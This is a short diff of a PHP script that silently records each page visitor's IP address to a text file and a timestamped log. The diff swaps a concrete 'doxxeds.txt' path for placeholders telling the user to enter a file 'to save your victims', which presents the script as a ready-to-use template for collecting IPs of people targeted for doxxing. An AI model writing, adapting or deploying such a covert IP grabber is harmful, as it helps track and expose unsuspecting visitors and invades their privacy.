@@ -17,10 +17,10 @@ function getUserIP() {
 
 $user_ip = getUserIP();
 
-$file_path = __DIR__ . '/tdm/tta/doxxeds.txt';
+$file_path = __DIR__ . 'ENTER-YOUR-FILE-PATH-AND-TXT-FOR-SAVE-YOUR-VICTIMS';
 
-if (!file_exists(__DIR__ . '/tdm/tta')) {
-    mkdir(__DIR__ . '/tdm/tta', 0777, true);
+if (!file_exists(__DIR__ . 'ENTER-YOUR-FILE-PATH')) {
+    mkdir(__DIR__ . 'ENTER-YOUR-FILE-PATH', 0777, true);
 }
 
 $fp = fopen($file_path, 'a');
@@ -28,5 +28,5 @@ fwrite($fp, $user_ip . PHP_EOL);
 fclose($fp);
 
 $line = date('Y-m-d H:i:s') . " - $user_ip";
-file_put_contents(__DIR__ . '/tdm/tta/visitors.log', $line . PHP_EOL, FILE_APPEND);
+file_put_contents(__DIR__ . 'ENTER-YOUR-FILE-PATH/visitors.log', $line . PHP_EOL, FILE_APPEND);
         ?>
